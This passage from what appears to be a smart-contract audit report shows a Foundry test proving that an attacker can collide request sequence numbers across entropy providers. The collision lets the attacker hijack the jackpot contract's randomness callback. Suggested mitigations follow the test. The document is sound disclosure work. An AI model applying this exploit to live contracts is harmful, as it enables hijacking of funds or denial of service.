        IScaledEntropyProvider.SetRequest[] memory reqB = new IScaledEntropyProvider.SetRequest[](1);
        reqB[0] = IScaledEntropyProvider.SetRequest({samples: 1, minRange: 1, maxRange: 2, withReplacement: true});

        vm.prank(address(attacker));
        uint64 s1 = sep.requestAndCallbackScaledRandomness{value: 1}(100_000, reqB, AttackConsumer.hackedCallback.selector, "");
        assertEq(s1, s0, "sequence collision across providers");

        // Validate overwrite without referencing internal types by destructuring the returned struct
        (
            address cb,
            ,
            ,
            ,
            IScaledEntropyProvider.SetRequest[] memory sets
        ) = sep.getPendingRequest(s0);
        assertEq(cb, address(attacker), "callback overwritten by attacker");
        assertEq(sets.length, 3, "setRequests length appended (old+new)");

        // Entropy callback for OLD provider s0 delivers to attacker, not to jackpot (DoS/hijack)
        vm.prank(address(entropy));
        sep._entropyCallback(s0, provider0, bytes32(uint256(123)));

        assertTrue(attacker.gotCalled(), "attacker must be called");
        assertFalse(jackpot.gotCalled(), "jackpot should not be called");
    }
}


## Suggested Mitigation
- Key pending requests by both provider and sequence, and validate the provider on callback:
  • Use mapping(bytes32 => PendingRequest) pending; with key = keccak256(abi.encodePacked(provider, sequence)).
  • Store the provider alongside the request or derive from the key; in entropyCallback require that the passed provider matches the key used to lookup the pending request.
- Before writing a new pending entry for a key, clear any existing storage to avoid array remnants (delete pending[key]) and then push the new setRequests.
- Do not rely on sequence alone across provider rotations; alternatively maintain a monotonically increasing local nonce and include it in the key to guarantee uniqueness.



